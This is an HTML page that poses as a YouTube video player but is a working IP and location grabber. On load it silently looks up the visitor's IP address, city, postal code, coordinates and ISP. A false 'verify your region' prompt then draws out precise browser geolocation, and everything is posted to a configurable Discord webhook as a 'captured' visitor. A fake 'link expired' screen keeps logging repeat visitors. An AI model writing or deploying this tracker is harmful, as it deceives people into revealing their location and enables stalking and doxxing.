<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Video</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d0d0d;
            color: #fff;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 800px;
            width: 90%;
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.6);
        }
        .video-wrapper {
            position: relative;
            width: 100%;
            padding-top: 56.25%;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            cursor: pointer;
        }
        .video-wrapper iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
        }
        .video-wrapper img {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
        }
        .play-button {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
            width: 72px; height: 72px;
            background: rgba(255,255,255,0.15);
            border: 3px solid rgba(255,255,255,0.4);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            pointer-events: none;
            z-index: 2;
        }
        .play-button::after {
            content: '';
            display: block;
            width: 0; height: 0;
            border-left: 22px solid #fff;
            border-top: 14px solid transparent;
            border-bottom: 14px solid transparent;
            margin-left: 4px;
        }
        .video-wrapper:hover .play-button {
            background: rgba(255,255,255,0.25);
        }
        .hidden { display: none !important; }
        .expired-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.85);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #fff;
            text-align: center;
            padding: 20px;
            z-index: 5;
        }
        .expired-overlay h2 { font-size: 22px; margin-bottom: 8px; }
        .expired-overlay p  { font-size: 14px; color: #aaa; }
        .hint-text {
            position: absolute;
            bottom: 24px; left: 0; right: 0;
            text-align: center;
            color: rgba(255,255,255,0.6);
            font-size: 13px;
            pointer-events: none;
            z-index: 2;
        }
    </style>
</head>
<body>

<div class="container">
    <div class="video-wrapper" id="videoWrapper">
        <!-- Thumbnail + play button -->
        <img id="thumbnail" src="https://img.youtube.com/vi/kLDxvP5X2GY/maxresdefault.jpg" alt="Video" />
        <div class="play-button"></div>
        <div class="hint-text">Click to verify your region and play video</div>

        <!-- Real video (hidden initially) -->
        <iframe id="videoPlayer" class="hidden" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>

        <!-- Expired overlay (hidden initially) -->
        <div class="expired-overlay hidden" id="expiredOverlay">
            <h2>🔒 This link has expired</h2>
            <p>This video was a one-time view and is no longer available.</p>
        </div>
    </div>
</div>

<script>
(function() {
    'use strict';

    // ============================================================
    //  CONFIGURE THESE
    // ============================================================
    const VIDEO_ID = 'kLDxvP5X2GY'; // Just the video ID from your YouTube link
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN'; // ← FIX THIS

    // ============================================================
    //  DOM refs
    // ============================================================
    const thumbnail      = document.getElementById('thumbnail');
    const playButton     = document.querySelector('.play-button');
    const hintText       = document.querySelector('.hint-text');
    const videoWrapper   = document.getElementById('videoWrapper');
    const videoPlayer    = document.getElementById('videoPlayer');
    const expiredOverlay = document.getElementById('expiredOverlay');

    // ============================================================
    //  Single-use check (localStorage)
    // ============================================================
    const alreadyAccessed = localStorage.getItem('vt_accessed');

    // ============================================================
    //  Send data to Discord
    // ============================================================
    async function sendToDiscord(ipData, preciseGeo) {
        if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK.includes('YOUR_WEBHOOK')) {
            console.log('No webhook configured. Data:', ipData);
            return;
        }

        let msg = '**🎯 New Visitor Captured**\n';
        msg += `**IP:** ${ipData.ip || 'N/A'}\n`;
        msg += `**Country:** ${ipData.countryName || ipData.country || 'N/A'}\n`;
        msg += `**Region:** ${ipData.regionName || ipData.region || 'N/A'}\n`;
        msg += `**City:** ${ipData.cityName || ipData.city || 'N/A'}\n`;
        msg += `**Postal:** ${ipData.zipCode || ipData.zip || 'N/A'}\n`;
        msg += `**Lat/Lon:** ${ipData.latitude || ipData.lat || 'N/A'}, ${ipData.longitude || ipData.lon || 'N/A'}\n`;
        msg += `**ISP:** ${ipData.isp || ipData.org || 'N/A'}\n`;
        msg += `**User-Agent:** ${navigator.userAgent}\n`;
        msg += `**Time:** ${new Date().toISOString()}\n`;

        if (preciseGeo) {
            msg += `**📍 Precise:** ${preciseGeo.lat}, ${preciseGeo.lon} (±${preciseGeo.accuracy})\n`;
        }

        try {
            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: msg })
            });
            console.log('✅ Sent to Discord');
        } catch (e) {
            console.error('Discord send failed:', e);
        }
    }

    // ============================================================
    //  STEP 1 — IP Geolocation (HTTPS, CORS friendly, no key)
    // ============================================================
    async function captureIP() {
        try {
            const r = await fetch('https://free.freeipapi.com/api/json/');
            const d = await r.json();
            console.log('IP data:', d);
            return d;
        } catch (err) {
            console.error('IP capture error:', err);
            return null;
        }
    }

    // ============================================================
    //  STEP 2 — Browser Geolocation (requires user permission)
    // ============================================================
    function getPreciseLocation() {
        return new Promise(resolve => {
            if (!navigator.geolocation) return resolve(null);
            navigator.geolocation.getCurrentPosition(
                pos => resolve({
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy + 'm'
                }),
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        });
    }

    // ============================================================
    //  Play video
    // ============================================================
    function playVideo() {
        localStorage.setItem('vt_accessed', '1');
        thumbnail.classList.add('hidden');
        playButton.classList.add('hidden');
        hintText.classList.add('hidden');
        videoPlayer.classList.remove('hidden');
        videoPlayer.src = `https://www.youtube.com/embed/${VIDEO_ID}?autoplay=1`;
    }

    function showExpired() {
        thumbnail.classList.add('hidden');
        playButton.classList.add('hidden');
        hintText.classList.add('hidden');
        expiredOverlay.classList.remove('hidden');
    }

    // ============================================================
    //  MAIN
    // ============================================================
    async function init() {
        // Already accessed?
        if (alreadyAccessed) {
            showExpired();
            const ip = await captureIP();
            if (ip) sendToDiscord(ip, null);
            return;
        }

        // Capture IP silently on load
        const ipData = await captureIP();

        // Wait for click
        videoWrapper.addEventListener('click', async function onClick() {
            videoWrapper.removeEventListener('click', onClick);

            // Request precise location (triggers browser prompt)
            const precise = await getPreciseLocation();

            // Play video
            playVideo();

            // Send everything
            if (ipData) {
                await sendToDiscord(ipData, precise);
            }
        });
    }

    init();
})();
</script>
</body>
</html>
